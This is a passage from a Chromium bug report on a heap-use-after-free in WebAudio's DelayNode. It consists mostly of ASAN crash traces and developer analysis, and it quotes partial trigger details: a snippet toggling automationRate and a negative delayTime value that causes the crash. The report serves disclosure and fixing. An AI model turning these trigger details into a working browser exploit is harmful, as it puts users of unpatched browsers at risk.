    #0 0x7ffac6deeca1 in media::FakeAudioWorker::Worker::DoRead C:\b\s\w\ir\cache\builder\src\media\base\fake_audio_worker.cc:190  
    #1 0x7ffac6deeca1 in media::FakeAudioWorker::Worker::DoRead C:\b\s\w\ir\cache\builder\src\media\base\fake_audio_worker.cc:190  
    #2 0x7ffac6deeca1 in media::FakeAudioWorker::Worker::DoRead C:\b\s\w\ir\cache\builder\src\media\base\fake_audio_worker.cc:190  
    #3 0x7ffac6deeca1 in media::FakeAudioWorker::Worker::DoRead C:\b\s\w\ir\cache\builder\src\media\base\fake_audio_worker.cc:190  
  
  
MiraclePtr Status: NOT PROTECTED  
No raw_ptr<T> access to this region was detected prior to this crash.  
This crash is still exploitable with MiraclePtr.  
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.  
  
==23940==END OF ADDITIONAL INFO  
==23940==ABORTING  

```

**CREDIT INFORMATION**

Reporter credit: Huang Xilin of Ant Group Light-Year Security Lab

## Attachments

- [uaf.html](attachments/uaf.html) (text/plain, 644 B)

## Timeline

### [Deleted User] (2023-11-24)

[Empty comment from Monorail migration]

### cl...@chromium.org (2023-11-24)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6374313112829952.

### cl...@chromium.org (2023-11-25)

ClusterFuzz testcase 6374313112829952 appears to be flaky, updating reproducibility label.

### cl...@chromium.org (2023-11-25)

Detailed Report: https://clusterfuzz.com/testcase?key=6374313112829952

Fuzzer: None
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x7af066d85198
Crash State:
  blink::Delay::ProcessARateVector
  blink::Delay::ProcessARate
  blink::DelayHandler::Process
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&revision=1228878

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6374313112829952

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


************************* UNREPRODUCIBLE *************************
Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days, we've been seeing this crash frequently.

It may be possible to reproduce by trying the following options:
- Run testcase multiple times for a longer duration.
- Run fuzzing without testcase argument to hit the same crash signature.

If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.
******************************************************************

A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### el...@chromium.org (2023-11-27)

Looks like Clusterfuzz reproduced it with this stack trace:

==1==ERROR: AddressSanitizer: heap-use-after-free on address 0x7af066d85198 at pc 0x581c315668d7 bp 0x7af06809be10 sp 0x7af06809be08
[3064705:3064712:1124/235146.402943:WARNING:sync_reader.cc(198)] SyncReader::Read timed out, audio glitch count=10
READ of size 4 at 0x7af066d85198 thread T14 (AudioOutputDevi)
SCARINESS: 45 (4-byte-read-heap-use-after-free)
    #0 0x581c315668d6 in blink::Delay::ProcessARateVector(float*, unsigned int) const third_party/blink/renderer/platform/audio/cpu/x86/delay_sse2.cc:111:20
    #1 0x581c31565cf1 in blink::Delay::ProcessARate(float const*, float*, unsigned int) third_party/blink/renderer/platform/audio/delay.cc:197:7
    #2 0x581c316a2fd0 in blink::DelayHandler::Process(unsigned int) third_party/blink/renderer/modules/webaudio/delay_handler.cc:73:24
    #3 0x581c315a5bd6 in blink::AudioHandler::ProcessIfNecessary(unsigned int) third_party/blink/renderer/modules/webaudio/audio_handler.cc:347:7
    #4 0x581c315cf3a1 in blink::AudioNodeOutput::Pull(blink::AudioBus*, unsigned int) third_party/blink/renderer/modules/webaudio/audio_node_output.cc:134:13
    #5 0x581c315cc38c in blink::AudioNodeInput::SumAllConnections(scoped_refptr<blink::AudioBus>, unsigned int) third_party/blink/renderer/modules/webaudio/audio_node_input.cc:132:40
    #6 0x581c315cc882 in blink::AudioNodeInput::Pull(blink::AudioBus*, unsigned int) third_party/blink/renderer/modules/webaudio/audio_node_input.cc:162:3
    #7 0x581c3171a2da in blink::RealtimeAudioDestinationHandler::Render(blink::AudioBus*, unsigned int, blink::AudioIOPosition const&, blink::AudioCallbackMetric const&) third_party/blink/renderer/modules/webaudio/realtime_audio_destination_handler.cc:222:18
    #8 0x581c31726f09 in blink::AudioDestination::ProvideResamplerInput(int, blink::AudioBus*) third_party/blink/renderer/platform/audio/audio_destination.cc:546:14
    #9 0x581c31728fbe in Invoke<void (blink::AudioDestination::*)(int, blink::AudioBus *), blink::AudioDestination *, int, blink::AudioBus *> base/functional/bind_internal.h:713:12
    #10 0x581c31728fbe in MakeItSo<void (blink::AudioDestination::*const &)(int, blink::AudioBus *), const std::__Cr::tuple<WTF::CrossThreadUnretainedWrapper<blink::AudioDestination> > &, int, blink::AudioBus *> base/functional/bind_internal.h:868:12
    #11 0x581c31728fbe in RunImpl<void (blink::AudioDestination::*const &)(int, blink::AudioBus *), const std::__Cr::tuple<WTF::CrossThreadUnretainedWrapper<blink::AudioDestination> > &, 0UL> base/functional/bind_internal.h:968:12
    #12 0x581c31728fbe in base::internal::Invoker<base::internal::BindState<void (blink::AudioDestination::*)(int, blink::AudioBus*), WTF::CrossThreadUnretainedWrapper<blink::AudioDestination>>, void (int, blink::AudioBus*)>::Run(base::internal::BindStateBase*, int, blink::AudioBus*) base/functional/bind_internal.h:932:12
    #13 0x581c316c77eb in base::RepeatingCallback<void (int, blink::AudioBus*)>::Run(int, blink::AudioBus*) const & base/functional/callback.h:348:12
    #14 0x581c316c6bcb in Run third_party/blink/renderer/platform/wtf/functional.h:304:22
    #15 0x581c316c6bcb in blink::MediaMultiChannelResampler::ProvideResamplerInput(int, media::AudioBus*) third_party/blink/renderer/platform/audio/media_multi_channel_resampler.cc:59:12
    #16 0x581c316c74cb in Invoke<void (blink::MediaMultiChannelResampler::*)(int, media::AudioBus *), blink::MediaMultiChannelResampler *, int, media::AudioBus *> base/functional/bind_internal.h:713:12
    #17 0x581c316c74cb in MakeItSo<void (blink::MediaMultiChannelResampler::*const &)(int, media::AudioBus *), const std::__Cr::tuple<base::internal::UnretainedWrapper<blink::MediaMultiChannelResampler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> > &, int, media::AudioBus *> base/functional/bind_internal.h:868:12
    #18 0x581c316c74cb in RunImpl<void (blink::MediaMultiChannelResampler::*const &)(int, media::AudioBus *), const std::__Cr::tuple<base::internal::UnretainedWrapper<blink::MediaMultiChannelResampler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> > &, 0UL> base/functional/bind_internal.h:968:12
    #19 0x581c316c74cb in base::internal::Invoker<base::internal::BindState<void (blink::MediaMultiChannelResampler::*)(int, media::AudioBus*), base::internal::UnretainedWrapper<blink::MediaMultiChannelResampler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void (int, media::AudioBus*)>::Run(base::internal::BindStateBase*, int, media::AudioBus*) base/functional/bind_internal.h:932:12
    #20 0x581c0b33400b in base::RepeatingCallback<void (int, media::AudioBus*)>::Run(int, media::AudioBus*) const & base/functional/callback.h:348:12
    #21 0x581c0b3b70c6 in Invoke<void (media::MultiChannelResampler::*)(int, int, float *), media::MultiChannelResampler *, const int &, int, float *> base/functional/bind_internal.h:713:12
    #22 0x581c0b3b70c6 in MakeItSo<void (media::MultiChannelResampler::*const &)(int, int, float *), const std::__Cr::tuple<base::internal::UnretainedWrapper<media::MultiChannelResampler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, int> &, int, float *> base/functional/bind_internal.h:868:12
    #23 0x581c0b3b70c6 in RunImpl<void (media::MultiChannelResampler::*const &)(int, int, float *), const std::__Cr::tuple<base::internal::UnretainedWrapper<media::MultiChannelResampler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, int> &, 0UL, 1UL> base/functional/bind_internal.h:968:12
    #24 0x581c0b3b70c6 in base::internal::Invoker<base::internal::BindState<void (media::MultiChannelResampler::*)(int, int, float*), base::internal::UnretainedWrapper<media::MultiChannelResampler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, int>, void (int, float*)>::Run(base::internal::BindStateBase*, int, float*) base/functional/bind_internal.h:932:12
    #25 0x581c0b4050eb in base::RepeatingCallback<void (int, float*)>::Run(int, float*) const & base/functional/callback.h:348:12
    #26 0x581c0b404b38 in media::SincResampler::Resample(int, float*) media/base/sinc_resampler.cc:343:14
    #27 0x581c0b3b5be5 in media::MultiChannelResampler::Resample(int, media::AudioBus*) media/base/multi_channel_resampler.cc:77:23
    #28 0x581c31720ea2 in blink::AudioDestination::RequestRender(unsigned long, unsigned long, double, double) third_party/blink/renderer/platform/audio/audio_destination.cc:529:19
    #29 0x581c3171f1d8 in blink::AudioDestination::Render(base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, media::AudioBus*) third_party/blink/renderer/platform/audio/audio_destination.cc:202:7
    #30 0x581c364775e7 in content::RendererWebAudioDeviceImpl::Render(base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, media::AudioBus*) content/renderer/media/renderer_webaudiodevice_impl.cc:287:27
    #31 0x581c0b3fc150 in media::SilentSinkSuspender::Render(base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, media::AudioBus*) media/base/silent_sink_suspender.cc:83:14
    #32 0x581c0b2a3c17 in media::AudioOutputDeviceThreadCallback::Process(unsigned int) media/audio/audio_output_device_thread_callback.cc:94:21
    #33 0x581c0b26b243 in media::AudioDeviceThread::ThreadMain() media/audio/audio_device_thread.cc:98:18
    #34 0x581c1c789ae0 in base::(anonymous namespace)::ThreadFunc(void*) base/threading/platform_thread_posix.cc:101:13
    #35 0x581c08154a28 in asan_thread_start(void*) third_party/llvm/compiler-rt/lib/asan/asan_interceptors.cpp:234:28
0x7af066d85198 is located 3013016 bytes inside of 3072544-byte region [0x7af066aa5800,0x7af066d93a20)
freed by thread T14 (AudioOutputDevi) here:
    #0 0x581c08156c06 in __interceptor_free third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cpp:52:3
    #1 0x581c3155ede5 in ~AudioArray third_party/blink/renderer/platform/audio/audio_array.h:57:19
    #2 0x581c3155ede5 in blink::Delay::~Delay() third_party/blink/renderer/platform/audio/delay.h:36:23
    #3 0x581c316a458e in operator() third_party/libc++/src/include/__memory/unique_ptr.h:68:5
    #4 0x581c316a458e in reset third_party/libc++/src/include/__memory/unique_ptr.h:297:7
    #5 0x581c316a458e in ~unique_ptr third_party/libc++/src/include/__memory/unique_ptr.h:263:75
    #6 0x581c316a458e in Destruct third_party/blink/renderer/platform/wtf/vector.h:166:15
    #7 0x581c316a458e in WTF::Vector<std::__Cr::unique_ptr<blink::Delay, std::__Cr::default_delete<blink::Delay>>, 0u, WTF::PartitionAllocator>::Shrink(unsigned int) third_party/blink/renderer/platform/wtf/vector.h:1867:3
    #8 0x581c316a1e3f in ShrinkCapacity third_party/blink/renderer/platform/wtf/vector.h:1949:5
    #9 0x581c316a1e3f in clear third_party/blink/renderer/platform/wtf/vector.h:1299:43
    #10 0x581c316a1e3f in blink::DelayHandler::Uninitialize() third_party/blink/renderer/modules/webaudio/delay_handler.cc:125:14
    #11 0x581c316a3502 in blink::DelayHandler::CheckNumberOfChannelsForInput(blink::AudioNodeInput*) third_party/blink/renderer/modules/webaudio/delay_handler.cc:144:5
    #12 0x581c315cb26d in blink::AudioNodeInput::DidUpdate() third_party/blink/renderer/modules/webaudio/audio_node_input.cc:50:13
    #13 0x581c31604b92 in blink::AudioSummingJunction::UpdateRenderingState() third_party/blink/renderer/modules/webaudio/audio_summing_junction.cc:62:5
    #14 0x581c31699690 in HandleDirtyAudioSummingJunctions third_party/blink/renderer/modules/webaudio/deferred_task_handler.cc:118:15
    #15 0x581c31699690 in blink::DeferredTaskHandler::HandleDeferredTasks() third_party/blink/renderer/modules/webaudio/deferred_task_handler.cc:310:3
    #16 0x581c3158dc3a in blink::AudioContext::HandlePreRenderTasks(blink::AudioIOPosition const*, blink::AudioCallbackMetric const*) third_party/blink/renderer/modules/webaudio/audio_context.cc:846:30
    #17 0x581c3171a256 in blink::RealtimeAudioDestinationHandler::Render(blink::AudioBus*, unsigned int, blink::AudioIOPosition const&, blink::AudioCallbackMetric const&) third_party/blink/renderer/modules/webaudio/realtime_audio_destination_handler.cc:213:12
    #18 0x581c31726f09 in blink::AudioDestination::ProvideResamplerInput(int, blink::AudioBus*) third_party/blink/renderer/platform/audio/audio_destination.cc:546:14
    #19 0x581c31728fbe in Invoke<void (blink::AudioDestination::*)(int, blink::AudioBus *), blink::AudioDestination *, int, blink::AudioBus *> base/functional/bind_internal.h:713:12
    #20 0x581c31728fbe in MakeItSo<void (blink::AudioDestination::*const &)(int, blink::AudioBus *), const std::__Cr::tuple<WTF::CrossThreadUnretainedWrapper<blink::AudioDestination> > &, int, blink::AudioBus *> base/functional/bind_internal.h:868:12
    #21 0x581c31728fbe in RunImpl<void (blink::AudioDestination::*const &)(int, blink::AudioBus *), const std::__Cr::tuple<WTF::CrossThreadUnretainedWrapper<blink::AudioDestination> > &, 0UL> base/functional/bind_internal.h:968:12
    #22 0x581c31728fbe in base::internal::Invoker<base::internal::BindState<void (blink::AudioDestination::*)(int, blink::AudioBus*), WTF::CrossThreadUnretainedWrapper<blink::AudioDestination>>, void (int, blink::AudioBus*)>::Run(base::internal::BindStateBase*, int, blink::AudioBus*) base/functional/bind_internal.h:932:12
    #23 0x581c316c77eb in base::RepeatingCallback<void (int, blink::AudioBus*)>::Run(int, blink::AudioBus*) const & base/functional/callback.h:348:12
    #24 0x581c316c6bcb in Run third_party/blink/renderer/platform/wtf/functional.h:304:22
    #25 0x581c316c6bcb in blink::MediaMultiChannelResampler::ProvideResamplerInput(int, media::AudioBus*) third_party/blink/renderer/platform/audio/media_multi_channel_resampler.cc:59:12
    #26 0x581c316c74cb in Invoke<void (blink::MediaMultiChannelResampler::*)(int, media::AudioBus *), blink::MediaMultiChannelResampler *, int, media::AudioBus *> base/functional/bind_internal.h:713:12
    #27 0x581c316c74cb in MakeItSo<void (blink::MediaMultiChannelResampler::*const &)(int, media::AudioBus *), const std::__Cr::tuple<base::internal::UnretainedWrapper<blink::MediaMultiChannelResampler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> > &, int, media::AudioBus *> base/functional/bind_internal.h:868:12
    #28 0x581c316c74cb in RunImpl<void (blink::MediaMultiChannelResampler::*const &)(int, media::AudioBus *), const std::__Cr::tuple<base::internal::UnretainedWrapper<blink::MediaMultiChannelResampler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> > &, 0UL> base/functional/bind_internal.h:968:12
    #29 0x581c316c74cb in base::internal::Invoker<base::internal::BindState<void (blink::MediaMultiChannelResampler::*)(int, media::AudioBus*), base::internal::UnretainedWrapper<blink::MediaMultiChannelResampler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void (int, media::AudioBus*)>::Run(base::internal::BindStateBase*, int, media::AudioBus*) base/functional/bind_internal.h:932:12
    #30 0x581c0b33400b in base::RepeatingCallback<void (int, media::AudioBus*)>::Run(int, media::AudioBus*) const & base/functional/callback.h:348:12
    #31 0x581c0b3b70c6 in Invoke<void (media::MultiChannelResampler::*)(int, int, float *), media::MultiChannelResampler *, const int &, int, float *> base/functional/bind_internal.h:713:12
    #32 0x581c0b3b70c6 in MakeItSo<void (media::MultiChannelResampler::*const &)(int, int, float *), const std::__Cr::tuple<base::internal::UnretainedWrapper<media::MultiChannelResampler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, int> &, int, float *> base/functional/bind_internal.h:868:12
    #33 0x581c0b3b70c6 in RunImpl<void (media::MultiChannelResampler::*const &)(int, int, float *), const std::__Cr::tuple<base::internal::UnretainedWrapper<media::MultiChannelResampler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, int> &, 0UL, 1UL> base/functional/bind_internal.h:968:12
    #34 0x581c0b3b70c6 in base::internal::Invoker<base::internal::BindState<void (media::MultiChannelResampler::*)(int, int, float*), base::internal::UnretainedWrapper<media::MultiChannelResampler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, int>, void (int, float*)>::Run(base::internal::BindStateBase*, int, float*) base/functional/bind_internal.h:932:12
    #35 0x581c0b4050eb in base::RepeatingCallback<void (int, float*)>::Run(int, float*) const & base/functional/callback.h:348:12
    #36 0x581c0b404b38 in media::SincResampler::Resample(int, float*) media/base/sinc_resampler.cc:343:14
    #37 0x581c0b3b5be5 in media::MultiChannelResampler::Resample(int, media::AudioBus*) media/base/multi_channel_resampler.cc:77:23
    #38 0x581c31720ea2 in blink::AudioDestination::RequestRender(unsigned long, unsigned long, double, double) third_party/blink/renderer/platform/audio/audio_destination.cc:529:19
    #39 0x581c3171f1d8 in blink::AudioDestination::Render(base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, media::AudioBus*) third_party/blink/renderer/platform/audio/audio_destination.cc:202:7
    #40 0x581c364775e7 in content::RendererWebAudioDeviceImpl::Render(base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, media::AudioBus*) content/renderer/media/renderer_webaudiodevice_impl.cc:287:27
    #41 0x581c0b3fc150 in media::SilentSinkSuspender::Render(base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, media::AudioBus*) media/base/silent_sink_suspender.cc:83:14
    #42 0x581c0b2a3c17 in media::AudioOutputDeviceThreadCallback::Process(unsigned int) media/audio/audio_output_device_thread_callback.cc:94:21
    #43 0x581c0b26b243 in media::AudioDeviceThread::ThreadMain() media/audio/audio_device_thread.cc:98:18
    #44 0x581c1c789ae0 in base::(anonymous namespace)::ThreadFunc(void*) base/threading/platform_thread_posix.cc:101:13
    #45 0x581c08154a28 in asan_thread_start(void*) third_party/llvm/compiler-rt/lib/asan/asan_interceptors.cpp:234:28
previously allocated by thread T0 (chrome) here:
    #0 0x581c081570bf in ___interceptor_calloc third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cpp:77:3
    #1 0x581c23817de0 in AllocInternal<(partition_alloc::internal::AllocFlags)2> base/allocator/partition_allocator/src/partition_alloc/partition_root.h:1983:23
    #2 0x581c23817de0 in AllocInline<(partition_alloc::internal::AllocFlags)2> base/allocator/partition_allocator/src/partition_alloc/partition_root.h:498:12
    #3 0x581c23817de0 in WTF::Partitions::FastZeroedMalloc(unsigned long, char const*) third_party/blink/renderer/platform/wtf/allocator/partitions.cc:413:11
    #4 0x581c1885651a in blink::AudioArray<float>::Allocate(unsigned long) third_party/blink/renderer/platform/audio/audio_array.h:86:35
    #5 0x581c31565704 in blink::Delay::Delay(double, float, unsigned int) third_party/blink/renderer/platform/audio/delay.cc:81:11
    #6 0x581c316a245f in make_unique<blink::Delay, double &, float &, unsigned int &> third_party/libc++/src/include/__memory/unique_ptr.h:685:30
    #7 0x581c316a245f in blink::DelayHandler::Initialize() third_party/blink/renderer/modules/webaudio/delay_handler.cc:110:26
    #8 0x581c316a1a4f in blink::DelayHandler::Create(blink::AudioNode&, float, blink::AudioParamHandler&, double) third_party/blink/renderer/modules/webaudio/delay_handler.cc:27:11
    #9 0x581c316a0aaa in blink::DelayNode::DelayNode(blink::BaseAudioContext&, double) third_party/blink/renderer/modules/webaudio/delay_node.cc:57:14
    #10 0x581c316a0ee4 in Call<blink::BaseAudioContext &, double &> v8/include/cppgc/allocation.h:242:32
    #11 0x581c316a0ee4 in MakeGarbageCollected<blink::DelayNode, blink::BaseAudioContext &, double &> v8/include/cppgc/allocation.h:280:7
    #12 0x581c316a0ee4 in MakeGarbageCollected<blink::DelayNode, blink::BaseAudioContext &, double &> third_party/blink/renderer/platform/heap/garbage_collected.h:37:10
    #13 0x581c316a0ee4 in blink::DelayNode::Create(blink::BaseAudioContext&, double, blink::ExceptionState&) third_party/blink/renderer/modules/webaudio/delay_node.cc:83:10
    #14 0x581c2f64c08f in blink::(anonymous namespace)::v8_base_audio_context::CreateDelayOperationCallback(v8::FunctionCallbackInfo<v8::Value> const&) gen/third_party/blink/renderer/bindings/modules/v8/v8_base_audio_context.cc:559:32
    #15 0x581c1222d10f in Builtins_CallApiCallbackGeneric setup-isolate-deserialize.cc:0
    #16 0x581c1222aeb1 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc:0
    #17 0x581c1222891b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc:0
    #18 0x581c12228646 in Builtins_JSEntry setup-isolate-deserialize.cc:0
    #19 0x581c0e934e6a in Call v8/src/execution/simulator.h:178:12
    #20 0x581c0e934e6a in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:427:22
    #21 0x581c0e933f02 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*) v8/src/execution/execution.cc:528:10
    #22 0x581c0e45ddd5 in v8::Function::Call(v8::Local<v8::Context>, v8::Local<v8::Value>, int, v8::Local<v8::Value>*) v8/src/api/api.cc:5518:7
    #23 0x581c299e2e6b in blink::V8ScriptRunner::CallFunction(v8::Local<v8::Function>, blink::ExecutionContext*, v8::Local<v8::Value>, int, v8::Local<v8::Value>*, v8::Isolate*) third_party/blink/renderer/bindings/core/v8/v8_script_runner.cc:823:17
    #24 0x581c2e956b17 in blink::bindings::CallbackInvokeHelper<blink::CallbackFunctionWithTaskAttributionBase, (blink::bindings::CallbackInvokeHelperMode)0, (blink::bindings::CallbackReturnTypeIsPromise)0>::CallInternal(int, v8::Local<v8::Value>*) third_party/blink/renderer/bindings/core/v8/callback_invoke_helper.cc:153:12
    #25 0x581c2e9567b3 in blink::bindings::CallbackInvokeHelper<blink::CallbackFunctionWithTaskAttributionBase, (blink::bindings::CallbackInvokeHelperMode)0, (blink::bindings::CallbackReturnTypeIsPromise)0>::Call(int, v8::Local<v8::Value>*) third_party/blink/renderer/bindings/core/v8/callback_invoke_helper.cc:174:10
    #26 0x581c302edcea in blink::V8Function::Invoke(blink::bindings::V8ValueOrScriptWrappableAdapter, blink::HeapVector<blink::ScriptValue, 0u> const&) gen/third_party/blink/renderer/bindings/core/v8/v8_function.cc:67:13
    #27 0x581c302eef16 in blink::V8Function::InvokeAndReportException(blink::bindings::V8ValueOrScriptWrappableAdapter, blink::HeapVector<blink::ScriptValue, 0u> const&) gen/third_party/blink/renderer/bindings/core/v8/v8_function.cc:122:15
    #28 0x581c3265f16c in blink::ScheduledAction::Execute(blink::ExecutionContext*) third_party/blink/renderer/modules/scheduler/scheduled_action.cc:146:18
    #29 0x581c3265669b in blink::DOMTimer::Fired() third_party/blink/renderer/modules/scheduler/dom_timer.cc:402:14
    #30 0x581c2d98cd5d in blink::TimerBase::RunInternal() third_party/blink/renderer/platform/timer.cc:160:3
    #31 0x581c29949644 in Invoke<void (blink::TimerBase::*)(), blink::TimerBase *> base/functional/bind_internal.h:713:12
    #32 0x581c29949644 in MakeItSo<void (blink::TimerBase::*)(), std::__Cr::tuple<WTF::UnretainedWrapper<blink::TimerBase> > > base/functional/bind_internal.h:868:12
    #33 0x581c29949644 in RunImpl<void (blink::TimerBase::*)(), std::__Cr::tuple<WTF::UnretainedWrapper<blink::TimerBase> >, 0UL> base/functional/bind_internal.h:968:12
    #34 0x581c29949644 in base::internal::Invoker<base::internal::BindState<void (blink::TimerBase::*)(), WTF::UnretainedWrapper<blink::TimerBase>>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:919:12
    #35 0x581c1c63312f in Run base/functional/callback.h:156:12
    #36 0x581c1c63312f in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/task/common/task_annotator.cc:201:34
    #37 0x581c1c69eb77 in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:479:11)> base/task/common/task_annotator.h:89:5
    #38 0x581c1c69eb77 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:477:23
    #39 0x581c1c69d88d in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:342:41
    #40 0x581c1c69f9da in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:0
    #41 0x581c1c503a3f in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:40:55

### el...@chromium.org (2023-11-27)

Shepherd: Routing to //third_party/blink/renderer/platform/audio/OWNERS and applying some tabs. Not sure on the impact since we don't have a proper root cause or bisect yet.

[Monorail components: Blink>Media>Audio Blink>WebAudio]

### ho...@chromium.org (2023-11-27)

# Analysis

The repro code is rapidly attacking this property:

```js
sp.onaudioprocess = function (event) {
  delay.delayTime.automationRate = "k-rate";
  delay.delayTime.automationRate = "a-rate";
};
```

This triggers the parameter rate change through here:
https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/modules/webaudio/audio_param.cc;l=163

Note that the access to `automation_rate_` happens on the main thread. That said, the following code location in delay_handler.cc is touching the same member from the audio thread:
https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/modules/webaudio/audio_param_handler.h;l=199

Unfortunately this is not guarded by the `process_lock_`.

# Solution

The IsAudioRate() method should be accessed from the audio thread. The original design of this property is rather unfortunate, and we need to develop a new system for safe access/update. One option could be introducing a "dirty" flag and update the value at the render quantum boundary.

For the near-term fix, I propose to fix this by introducing a lock/tryLock combination.


### su...@gmail.com (2023-11-28)

Why was this issue classified as Bug type instead of Bug-Security?

### dc...@chromium.org (2023-11-28)

[Empty comment from Monorail migration]

### ho...@chromium.org (2023-11-29)

# Another finding

Removing the following line from the repro code avoids the ASAN UAF crash:

```
delay.delayTime.value = -2;
```

If the given value is less than -1, the UAF happens. So this is not a mutex problem, it's an array index problem. I'll keep looking.

### su...@gmail.com (2023-11-29)

Yes, I've also noticed that the value of `delay.delayTime.value` has a certain impact on triggering the bug. I tried increasing this value to 100, and it seems to make triggering a SEGV more likely.

=================================================================
==1300359==ERROR: AddressSanitizer: SEGV on unknown address 0x7fe72fccf5a0 (pc 0x559b77a1d3aa bp 0x7fe343dd4540 sp 0x7fe343dd4500 T8)
==1300359==The signal is caused by a READ memory access.
SCARINESS: 20 (wild-addr-read)
    #0 0x559b77a1d3aa in blink::Delay::ProcessARateVector(float*, unsigned int) const ./../../third_party/blink/renderer/platform/audio/cpu/x86/delay_sse2.cc:111:18
    #1 0x559b77a1cb61 in blink::Delay::ProcessARate(float const*, float*, unsigned int) ./../../third_party/blink/renderer/platform/audio/delay.cc:197:7
    #2 0x559b77b59f70 in blink::DelayHandler::Process(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/delay_handler.cc:73:24
    #3 0x559b77a5ccb6 in blink::AudioHandler::ProcessIfNecessary(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/audio_handler.cc:347:7
    #4 0x559b77a86441 in blink::AudioNodeOutput::Pull(blink::AudioBus*, unsigned int) ./../../third_party/blink/renderer/modules/webaudio/audio_node_output.cc:134:13
    #5 0x559b77a8342c in blink::AudioNodeInput::SumAllConnections(scoped_refptr<blink::AudioBus>, unsigned int) ./../../third_party/blink/renderer/modules/webaudio/audio_node_input.cc:132:40
    #6 0x559b77a83922 in blink::AudioNodeInput::Pull(blink::AudioBus*, unsigned int) ./../../third_party/blink/renderer/modules/webaudio/audio_node_input.cc:162:3
    #7 0x559b77bd110a in blink::RealtimeAudioDestinationHandler::Render(blink::AudioBus*, unsigned int, blink::AudioIOPosition const&, blink::AudioCallbackMetric const&) ./../../third_party/blink/renderer/modules/webaudio/realtime_audio_destination_handler.cc:222:18
    #8 0x559b77bde159 in blink::AudioDestination::ProvideResamplerInput(int, blink::AudioBus*) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:546:14
    #9 0x559b77be041e in Invoke<void (blink::AudioDestination::*)(int, blink::AudioBus *), blink::AudioDestination *, int, blink::AudioBus *> ./../../base/functional/bind_internal.h:712:12
    #10 0x559b77be041e in MakeItSo<void (blink::AudioDestination::*const &)(int, blink::AudioBus *), const std::__Cr::tuple<WTF::CrossThreadUnretainedWrapper<blink::AudioDestination> > &, int, blink::AudioBus *> ./../../base/functional/bind_internal.h:867:12
    #11 0x559b77be041e in RunImpl<void (blink::AudioDestination::*const &)(int, blink::AudioBus *), const std::__Cr::tuple<WTF::CrossThreadUnretainedWrapper<blink::AudioDestination> > &, 0UL> ./../../base/functional/bind_internal.h:967:12
    #12 0x559b77be041e in base::internal::Invoker<base::internal::BindState<void (blink::AudioDestination::*)(int, blink::AudioBus*), WTF::CrossThreadUnretainedWrapper<blink::AudioDestination>>, void (int, blink::AudioBus*)>::Run(base::internal::BindStateBase*, int, blink::AudioBus*) ./../../base/functional/bind_internal.h:931:12
    #13 0x559b77b7e6fb in base::RepeatingCallback<void (int, blink::AudioBus*)>::Run(int, blink::AudioBus*) const & ./../../base/functional/callback.h:348:12
    #14 0x559b77b7dada in Run ./../../third_party/blink/renderer/platform/wtf/functional.h:304:22
